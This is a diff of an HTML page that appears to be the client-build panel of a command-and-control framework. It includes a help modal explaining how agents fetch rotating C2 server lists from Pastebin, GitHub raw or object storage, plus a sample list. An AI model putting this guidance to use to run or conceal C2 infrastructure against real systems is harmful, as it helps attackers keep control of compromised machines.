+                    <path class="crack-mid" pathLength="1" d="M25 10 L13 14 L5 21" />
+                    <path class="crack-mid" pathLength="1" d="M75 18 L88 22 L99 20" />
+                    <path class="crack-late" pathLength="1" d="M7 5 L13 11 L9 18 L16 27 L12 35" />
+                    <path class="crack-late" pathLength="1" d="M94 4 L87 12 L91 18 L84 27 L89 35" />
+                    <path class="crack-late" pathLength="1" d="M38 1 L34 8 L39 14" />
+                    <path class="crack-late" pathLength="1" d="M62 35 L66 28 L61 22" />
+                  </svg>
+                </div>
+                <div class="sgn-txt-lock" aria-hidden="true">
+                  <i class="fa-solid fa-lock"></i>
+                </div>
+              </div>
+            </form>
+          </div>
+
+          <!-- Build Output -->
+          <div class="bg-slate-900/70 border border-slate-800 rounded-lg p-5">
+            <h2 class="text-xl font-semibold mb-4 flex items-center gap-2">
+              <i class="fa-solid fa-terminal"></i> Build Output
+            </h2>
+
+            <div id="build-status" class="mb-4 hidden">
+              <div class="flex items-center gap-2 p-3 rounded-lg bg-blue-900/40 border border-blue-700/60">
+                <i class="fa-solid fa-spinner fa-spin"></i>
+                <span id="build-status-text">Building...</span>
+              </div>
+            </div>
+
+            <div id="build-output-container"
+              class="bg-slate-950 border border-slate-700 rounded-lg p-4 min-h-[28rem] max-h-[calc(100vh-20rem)] overflow-y-auto font-mono text-sm">
+              <div id="build-output" class="text-slate-400">
+                Ready to build. Select platforms and click "Start Build".
+              </div>
+            </div>
+
+            <div id="build-results" class="mt-4 hidden">
+              <div class="flex items-center justify-between mb-2">
+                <h3 class="font-medium flex items-center gap-2">
+                  <i class="fa-solid fa-download"></i> Built Clients
+                </h3>
+                <button
+                  id="toggle-all-builds-btn"
+                  class="hidden inline-flex items-center gap-2 px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 border border-slate-700 text-slate-300 text-xs transition-colors"
+                  type="button"
+                >
+                  <i class="fa-solid fa-eye"></i>
+                  <span id="toggle-all-builds-label">Show All</span>
+                </button>
+              </div>
+              <div id="build-files" class="flex flex-col gap-2"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <!-- Raw HTTPS server list help modal -->
+    <div id="raw-server-list-modal" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/60 backdrop-blur-sm">
+      <div class="bg-slate-900 border border-slate-700 rounded-xl shadow-2xl max-w-2xl w-full mx-4 p-6 max-h-[90vh] overflow-y-auto">
+        <div class="flex items-start justify-between mb-4">
+          <div class="flex items-center gap-3">
+            <div class="w-10 h-10 rounded-full bg-blue-900/50 border border-blue-700 flex items-center justify-center shrink-0">
+              <i class="fa-solid fa-list text-blue-400"></i>
+            </div>
+            <h3 class="text-lg font-semibold text-white">Raw HTTPS Server List</h3>
+          </div>
+          <button type="button" id="raw-server-list-modal-close" aria-label="Close"
+            class="text-slate-400 hover:text-white p-1 -mr-1">
+            <i class="fa-solid fa-xmark"></i>
+          </button>
+        </div>
+        <div class="text-slate-300 text-sm space-y-4">
+          <p>
+            Instead of baking a single server address into the agent, point it at a
+            plain-text file you host somewhere. The agent fetches that file every
+            time it starts, parses the lines, and uses the URLs inside as its
+            actual C2 endpoints.
+          </p>
+          <p class="text-slate-400">
+            This lets you rotate, retire, or add C2 hosts without rebuilding and
+            redeploying agents — just edit the file.
+          </p>
+
+          <div>
+            <h4 class="text-slate-200 font-medium mb-2 flex items-center gap-2">
+              <i class="fa-solid fa-file-lines text-green-400"></i> File format
+            </h4>
+            <ul class="list-disc list-inside text-slate-400 space-y-1 ml-1">
+              <li>One server per line</li>
+              <li>Bare domain (<code class="text-slate-300">example.com:5173</code>) or full <code class="text-slate-300">wss://</code> URL</li>
+              <li>Lines starting with <code class="text-slate-300">#</code> are comments</li>
+              <li>Blank lines are ignored</li>
+              <li>Must contain at least one valid line, otherwise the agent gives up</li>
+            </ul>
+            <pre class="mt-3 p-3 bg-slate-950 border border-slate-800 rounded text-xs text-slate-300 overflow-x-auto"><code># Primary
+c2-us-east.example.com:5173
+
+# Backups
+wss://c2-eu.example.com:5173
+1.2.3.4:5173</code></pre>
+          </div>
+
+          <div>
+            <h4 class="text-slate-200 font-medium mb-2 flex items-center gap-2">
+              <i class="fa-solid fa-triangle-exclamation text-amber-400"></i> The URL must serve raw text
+            </h4>
+            <p class="text-slate-400">
+              The agent does a plain HTTP GET and reads the response body line by
+              line. If the URL returns an HTML page (the GitHub web view, the
+              Pastebin web view, a Notion page, etc.) the agent will try to parse
+              the HTML as server URLs and fail.
+            </p>
+            <p class="text-slate-400 mt-2">Good sources:</p>
+            <ul class="list-disc list-inside text-slate-400 space-y-1 ml-1">
+              <li>GitHub: use the <code class="text-slate-300">raw.githubusercontent.com/&hellip;</code> URL, not the <code class="text-slate-300">github.com/&hellip;/blob/&hellip;</code> page</li>
+              <li>Gist: click <em>Raw</em>, copy that URL</li>
+              <li>Pastebin: <code class="text-slate-300">pastebin.com/raw/&lt;id&gt;</code>, not <code class="text-slate-300">pastebin.com/&lt;id&gt;</code></li>
+              <li>S3 / R2 / any object storage serving the file as <code class="text-slate-300">text/plain</code></li>
+              <li>Any web server returning the raw file body</li>
+            </ul>
+          </div>
+
+          <div>
+            <h4 class="text-slate-200 font-medium mb-2 flex items-center gap-2">
+              <i class="fa-solid fa-lock text-blue-400"></i> Use HTTPS
+            </h4>
+            <p class="text-slate-400">
+              Use an <code class="text-slate-300">https://</code> URL so the list itself
+              can't be tampered with in transit. <code class="text-slate-300">http://</code>
+              is accepted but anyone on the network path can rewrite the response
+              and redirect your agents.
+            </p>
+          </div>
+        </div>
+        <div class="flex items-center justify-end mt-6">
+          <button type="button" id="raw-server-list-modal-ok"
+            class="px-4 py-2 rounded-lg bg-blue-600 hover:bg-blue-700 text-white transition-colors text-sm font-medium">
+            Got it
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Build & Update All Confirmation Modal -->
+    <div id="update-all-modal" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/60 backdrop-blur-sm">
+      <div class="bg-slate-900 border border-slate-700 rounded-xl shadow-2xl max-w-md w-full mx-4 p-6">
+        <div class="flex items-center gap-3 mb-4">
+          <div class="w-10 h-10 rounded-full bg-amber-900/50 border border-amber-700 flex items-center justify-center">
+            <i class="fa-solid fa-arrow-up-from-bracket text-amber-400"></i>
+          </div>
+          <h3 class="text-lg font-semibold text-white">Build &amp; Update All Clients</h3>
+        </div>
+        <div id="update-all-modal-body" class="text-slate-300 text-sm mb-6 space-y-2">
+          <p>Checking eligible clients...</p>
+        </div>
+        <div class="flex items-center justify-end gap-3">
+          <button id="update-all-cancel" type="button"
+            class="px-4 py-2 rounded-lg border border-slate-600 text-slate-300 hover:bg-slate-800 transition-colors text-sm font-medium">
+            Cancel
+          </button>
+          <button id="update-all-confirm" type="button"
+            class="px-4 py-2 rounded-lg bg-amber-600 hover:bg-amber-700 text-white transition-colors text-sm font-medium disabled:opacity-50 disabled:cursor-not-allowed">
+            <i class="fa-solid fa-hammer mr-1"></i> Build &amp; Update
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <script type="module" src="/assets/nav.js"></script>
+    <script type="module" src="/assets/build.js"></script>
+  </body>
+</html>
